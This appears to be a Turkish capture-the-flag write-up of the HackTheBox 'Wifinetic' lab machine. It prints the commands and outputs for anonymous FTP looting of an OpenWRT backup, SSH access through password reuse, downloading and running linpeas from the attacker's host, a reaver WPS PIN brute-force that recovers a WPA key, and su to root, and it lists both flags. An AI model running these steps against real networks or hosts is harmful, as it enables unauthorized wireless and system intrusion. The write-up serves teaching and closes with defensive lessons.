# HTB Wifinetic — Writeup

**Zorluk:** Easy | **OS:** Linux | **Platform:** HackTheBox

## Özet

Wifinetic, kablosuz ağ güvenliği ve ağ izleme konularına odaklanan, kolay seviyeli ama öğretici bir Linux makinesi. Kutunun hikâyesi klasik bir "bilgi sızıntısı zinciri" üzerine kurulu: anonim erişime açık bir FTP servisi, içinde barındırdığı bir OpenWRT yedeğiyle bize kablosuz ağın PSK'sini ve sistem kullanıcı listesini veriyor. Buradan elde edilen kimlik bilgileriyle SSH üzerinden `netadmin` kullanıcısı olarak foothold sağlanıyor. Privilege escalation tarafında ise makinenin gerçek teması devreye giriyor: `reaver` binary'sine tanımlanmış `cap_net_raw` capability'si sayesinde WPS PIN'i kaba kuvvetle kırıp erişim noktasının WPA parolasını elde ediyoruz — ki bu parola aynı zamanda `root` kullanıcısının şifresiyle aynı çıkıyor.

Bu writeup'ta izlediğim adımları, neden o adımı attığımı ve hangi detayın bir sonraki adıma nasıl kapı açtığını sırasıyla anlatıyorum.

---

## 1. Keşif (Reconnaissance)

İlk adım her zaman olduğu gibi kapsamlı bir Nmap taraması:

```bash
nmap -sS -A -T5 -p- 10.129.229.90
```

Sonuçlar:

```
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
53/tcp open  tcpwrapped
```

Üç şey hemen dikkat çekiyor:

1. **FTP'de anonim giriş açık** — klasik ama hâlâ çok işe yarayan bir başlangıç noktası.
2. **53/tcp `tcpwrapped`** olarak görünüyor; Nmap'in OS tahmini bu portu ve genel imzayı MikroTik RouterOS / gömülü Linux ile ilişkilendiriyor — makinenin bir ağ cihazı/router temalı olduğuna dair ilk ipucu.
3. Dosya isimleri (`MigrateOpenWrt.txt`, `ProjectOpenWRT.pdf`, `backup-OpenWrt-2023-07-26.tar`) doğrudan bir **OpenWRT** temasına işaret ediyor.

Bu noktada plan netleşiyor: önce FTP'yi boşaltıp içerikleri analiz edeceğim, ardından muhtemelen bir yapılandırma/yedek dosyasından kimlik bilgisi çıkaracağım.

---

## 2. Anonim FTP Üzerinden Bilgi Toplama

```bash
ftp 10.129.229.90
```

Anonim girişin açık olduğunu doğruladıktan sonra dizindeki tüm dosyaları çekiyorum:

```
ftp> get MigrateOpenWrt.txt
ftp> get backup-OpenWrt-2023-07-26.tar
ftp> get ProjectGreatMigration.pdf
ftp> get ProjectOpenWRT.pdf
ftp> get employees_wellness.pdf
```

Beş dosyanın tamamı indi. Sıradaki adım bunları tek tek analiz etmek — HTB makinelerinde genellikle "gürültü" dosyaları (sosyal mühendislik amaçlı, doğrudan teknik değer taşımayan) ile gerçek ipucu barındıran dosyalar karışık verilir, bu yüzden her birine göz atmak gerekiyor.

### Dosyaların Değerlendirilmesi

**`MigrateOpenWrt.txt`** — OpenWRT'den Debian'a geçiş sürecini adım adım özetleyen bir plan/checklist. Doğrudan bir kimlik bilgisi içermiyor ama önemli bir bağlam veriyor: şirket, OpenWRT tabanlı bir ağ cihazından bahsediyor ve geçiş sürecinde "Reaver aracıyla güvenlik testi yapılacak" notu düşülmüş — bu, ilerleyen aşamalarda karşımıza çıkacak `reaver` binary'sinin neden orada olduğuna dair erken bir sinyal.

**`employees_wellness.pdf`** ve **`ProjectOpenWRT.pdf`** — İçerik olarak İK duyurusu ve proje teklifi; teknik açıdan doğrudan bir zafiyet sunmuyorlar ama iki isim ve e-posta adresi not almaya değer: *Samantha Wood* (`samantha.wood93@wifinetic.htb`) ve *Oliver Walker* (`olivia.walker17@wifinetic.htb`, unvanı "Wireless Network Administrator"). İkinci kişinin unvanı, makinenin kablosuz ağ temasıyla doğrudan örtüşüyor — muhtemel bir kullanıcı adı/parola sözlüğü oluşturulacaksa bu isimler faydalı olabilir, ama bu senaryoda asıl kırılma noktası başka bir yerden geliyor.

**`backup-OpenWrt-2023-07-26.tar`** — İsminden de anlaşılacağı gibi bu, gerçek altın madeni. Açalım:

```bash
tar -xf backup-OpenWrt-2023-07-26.tar
```

Arşiv, klasik bir OpenWRT `/etc` dizin yapısını içeriyor:

```
config  dropbear  group  hosts  inittab  luci-uploads  nftables.d  opkg  passwd  profile  rc.local  shells  shinit  sysctl.conf  uhttpd.crt  uhttpd.key
```

Bu, tam olarak umduğum türden bir bulgu: bir yönlendiricinin/erişim noktasının konfigürasyon yedeği. `passwd` dosyasına bakıyorum:

```bash
cat passwd
```

```
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

Burada dikkat çeken satır `netadmin`. Bu, standart OpenWRT sistem kullanıcılarının arasında **sonradan eklenmiş** görünen, isimlendirmesiyle de "ağ yöneticisi" izlenimi veren bir hesap. Shell'i `/bin/false` olduğu için doğrudan interaktif bir OpenWRT oturumu açmaya yaramaz, ama bu bir son değil — asıl soru, bu kullanıcı adının **hedef makinede** (OpenWRT cihazının kendisinde değil, esas HTB kutusunda) SSH için geçerli olup olmadığı.

### Kablosuz Yapılandırmasında Parolanın Bulunması

Backup içindeki `config/wireless` dosyası, bu makinenin en kritik bulgusunu barındırıyor:

```bash
cat config/wireless
```

```
config wifi-iface 'wifinet0'
	option device 'radio0'
	option mode 'ap'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
	option wps_pushbutton '1'
```

Erişim noktasının WPA-PSK anahtarı düz metin olarak konfigürasyon dosyasında duruyor: `VeRyUniUqWiFIPasswrd1!`. Bu, kablosuz ağ için bir parola — ama pratikte kurumsal ortamlarda **parola tekrar kullanımı (password reuse)** o kadar yaygın bir alışkanlıktır ki, bu WiFi parolasını sistem hesaplarında da denemek her zaman ilk aklıma gelen adımdır. Elimde hem bir kullanıcı adı adayı (`netadmin`) hem de bir parola adayı (`VeRyUniUqWiFIPasswrd1!`) var; sırada bunları SSH'a karşı test etmek var.

---

## 3. Foothold — SSH Üzerinden Password Reuse

```bash
ssh netadmin@10.129.229.90
```

Şifre istemine kablosuz ağ parolasını giriyorum ve içeri giriyorum:

```
netadmin@wifinetic:~$ ls
user.txt
netadmin@wifinetic:~$ cat user.txt
1a05d1770d7267a601aadda4c66fd8db
```

`netadmin` hesabı, `/bin/false` kısıtlaması OpenWRT yedeğindeki tanıma aitti — asıl HTB makinesinde bu kullanıcı normal bir shell'e sahip. Password reuse varsayımı doğrulandı: OpenWRT cihazının WiFi parolası, aynı zamanda ana sistemdeki `netadmin` kullanıcısının SSH parolasıyla birebir aynı. User flag'i elimde.

---

## 4. Privilege Escalation Yüzeyinin Belirlenmesi

Foothold sonrası standart rutin: otomatik bir enumeration script'i ile hızlıca genel bir tarama yapmak. `linpeas.sh`'i basit bir HTTP sunucusu üzerinden indiriyorum:

```bash
# Kali tarafında
python3 -m http.server 8000

# Hedef makinede
cd /tmp
wget http://10.10.14.187:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Çıktının en dikkat çekici kısmı **capability** taraması altında geliyor:

```
Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

`reaver` burada listenin geri kalanına göre bağlamdan tamamen kopuk duruyor — `ping`, `mtr-packet`, `traceroute6` gibi araçlarda `cap_net_raw` beklenen bir şeydir (ham soket erişimi gerektirirler), ama `reaver`'ın burada bulunması **kasıtlı bir tasarım**. `reaver`, WPS (WiFi Protected Setup) protokolündeki PIN doğrulama zaafını kullanarak bir erişim noktasının WPA/WPA2 pre-shared key'ini kurtarmak için tasarlanmış, ham 802.11 frame'leriyle çalışan bir araçtır. Normalde `root` yetkisi gerektirir çünkü kablosuz arayüzü monitor moda alıp ham paket enjeksiyonu/dinlemesi yapması gerekir; burada `cap_net_raw` capability'si sayesinde bu işlemi `root` olmadan, sadece bu binary özelinde gerçekleştirebiliyoruz.

Bu tespit, önceki adımlardaki tüm ipuçlarını (OpenWRT teması, `MigrateOpenWrt.txt` içindeki "Reaver ile güvenlik testi" notu, kablosuz arayüz konfigürasyonundaki `wps_pushbutton '1'` ayarı) birleştiriyor: makinenin privilege escalation vektörü, gerçek bir WPS PIN brute-force saldırısı.

---

## 5. Kablosuz Arayüzlerin Tespiti

`reaver`'ı çalıştırabilmek için önce doğru arayüzü ve hedef BSSID'yi belirlemem gerekiyor:

```bash
iwconfig
```

```
wlan0     IEEE 802.11  Mode:Master  Tx-Power=20 dBm
hwsim0    no wireless extensions.
lo        no wireless extensions.
wlan2     IEEE 802.11  ESSID:off/any  Mode:Managed  Access Point: Not-Associated
eth0      no wireless extensions.
mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm
wlan1     IEEE 802.11  ESSID:"OpenWrt"  Mode:Managed  Frequency:2.412 GHz
          Access Point: 02:00:00:00:00:00
          Link Quality=70/70  Signal level=-30 dBm
```

Burada iki kritik bilgi var:

* **`mon0`** zaten monitor moddaki arayüz — `reaver` ham 802.11 frame'leriyle çalıştığı için tam olarak ihtiyacım olan interface bu. (Bu ortam `mac80211_hwsim` ile simüle edilmiş bir kablosuz ortam; gerçek bir donanım gerekmiyor, makine bunu sanal olarak sağlıyor.)
* **`wlan1`**, `OpenWrt` SSID'li erişim noktasına bağlı görünüyor ve **BSSID: `02:00:00:00:00:00`** bilgisini veriyor — bu, `reaver`'a hedef olarak vereceğim adres.

---

## 6. WPS PIN Kaba Kuvvet Saldırısı (Reaver)

Elimde interface (`mon0`) ve BSSID (`02:00:00:00:00:00`) var; saldırıyı başlatıyorum:

```bash
reaver -i mon0 -b 02:00:00:00:00:00 -vv
```

```
[+] Waiting for beacon from 02:00:00:00:00:00
[+] Switching mon0 to channel 1
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
```

`12345670` — WPS PIN'in son hanesi bir checksum olduğu için gerçek arama uzayı 8 haneden çok daha küçüktür (10^7 kombinasyon), ve bu ortamda **hiçbir kilitleme (lockout) mekanizması** devrede olmadığı için `reaver` M1–M7 EAPOL mesaj alışverişini tamamlayıp PIN'i saniyeler içinde kırıyor. PIN doğrulandığı anda WPS protokolü, erişim noktasının gerçek WPA pre-shared key'ini de bize teslim ediyor: `WhatIsRealAnDWhAtIsNot51121!`.

Bu, WPS'in bilinen ve köklü tasarım zafiyetidir — PIN'in 8 haneli tek parça yerine iki ayrı 4 haneli blok halinde doğrulanması, arama uzayını pratikte çok küçük bir sayıya indirger. Gerçek dünyada bu, WPS'in üretici/kurumsal ortamlarda neden büyük ölçüde devre dışı bırakılması gerektiğinin de temel nedenidir.

---

## 7. Root — Yeniden Parola Tekrar Kullanımı

Elimdeki yeni parolayı `netadmin` kullanıcısının `root` olma ihtimaline karşı deniyorum — çünkü bu makinede zaten bir kez parola tekrar kullanımı örüntüsü görmüştüm, aynı örüntünün tekrarlanması sürpriz olmaz:

```bash
su
Password: WhatIsRealAnDWhAtIsNot51121!
```

```
root@wifinetic:/tmp# cd /root
root@wifinetic:~# cat root.txt
849edb23b6855040acf4f9159b9be24c
```

Root flag'i elimde. Makine, aynı zayıf alışkanlığı (bir yerde kullanılan bir parolanın başka bir yerde de geçerli olması) iki kez art arda sergileyerek hem foothold hem de privilege escalation için kullanılabilir hale gelmiş.

---

## Sonuç ve Değerlendirme

Wifinetic, teknik zorluk seviyesi düşük olsa da güzel bir zincirleme örneği sunuyor:

1. **Bilgi sızıntısı → kimlik bilgisi:** Anonim FTP üzerinden erişilebilen bir konfigürasyon yedeği, hem kullanıcı adı hem de parola adayı sağladı.
2. **Parola tekrar kullanımı → foothold:** Kablosuz ağ parolası, sistem hesabı parolasıyla aynıydı.
3. **Aşırı yetkili binary → privesc:** `reaver`'a tanımlanmış gereksiz `cap_net_raw` capability'si, normalde `root` gerektiren bir saldırıyı düşük yetkili kullanıcıya açtı.
4. **Parola tekrar kullanımı (ikinci kez) → root:** WPS saldırısından elde edilen WPA anahtarı, `root` parolasıyla aynı çıktı.

**Savunma açısından çıkarılacak dersler:**

* FTP gibi servislerde anonim erişim, özellikle konfigürasyon/yedek dosyaları barındırılan dizinlerde kesinlikle kapatılmalı.
* Ağ cihazı yedekleri gibi hassas dosyalar düz metin parola içermemeli; en azından şifrelenmiş şekilde saklanmalı.
* Aynı parola, farklı sistemlerde (WiFi PSK, SSH, root) asla tekrar kullanılmamalı — bir katmanın ele geçirilmesi tüm zincirin çökmesine yol açıyor.
* WPS, mümkünse tamamen devre dışı bırakılmalı; açık tutulması gerekiyorsa PIN kilitleme (lockout) mekanizması mutlaka aktif olmalı.
* Binary'lere Linux capability atarken (`setcap`), gerçekten ihtiyaç duyulmayan yetkiler asla verilmemeli — `reaver` gibi saldırı amaçlı araçların sistemde bırakılması ve üstüne gereksiz capability tanımlanması, tek başına bir privilege escalation vektörüdür.

---

**Flag'ler:**

* User: `1a05d1770d7267a601aadda4c66fd8db`
* Root: `849edb23b6855040acf4f9159b9be24c`
